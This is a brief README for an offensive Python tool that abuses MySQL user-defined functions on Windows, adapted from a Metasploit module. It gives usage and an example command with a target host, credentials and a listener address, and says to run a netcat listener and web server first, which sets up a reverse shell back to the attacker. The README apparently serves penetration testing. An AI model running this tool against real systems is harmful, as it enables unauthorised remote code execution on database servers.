# Windows/MySQL: Abusing user-defined functions
A loose adaptation of Metasploit's exploit/multi/mysql/mysql_udf_payload.  

    Note: run a netcat listener and set up a web server in the current directory before running.
    usage: mysql_udf.py [-h] [-r RHOST] -u USER -p PASSWORD [-a ARCHITECTURE] -l LHOST -lp LPORT

    e.g. python3 mysql_udf.py -r 10.10.10.10 -u test -p testuser -a x64 -l 10.10.10.11 -lp 4444